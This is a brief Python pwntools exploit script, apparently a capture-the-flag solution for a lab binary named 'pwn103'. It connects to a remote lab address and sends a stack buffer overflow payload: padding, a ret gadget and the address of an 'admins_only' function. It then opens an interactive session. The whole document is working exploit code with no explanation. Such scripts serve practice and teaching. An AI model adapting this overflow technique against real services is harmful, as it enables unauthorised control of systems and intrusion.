from pwn import *

#io = process("./pwn103")
io = remote("10.10.166.74", 9003)
elf = ELF("./pwn103")
rop = ROP(elf)
ret_address = rop.find_gadget(["ret"])[0]

io.sendlineafter(":", b"3")

payload = b"A"*40 + p64(ret_address) + p64(elf.sym.admins_only)

io.sendlineafter(":", payload)

io.interactive()

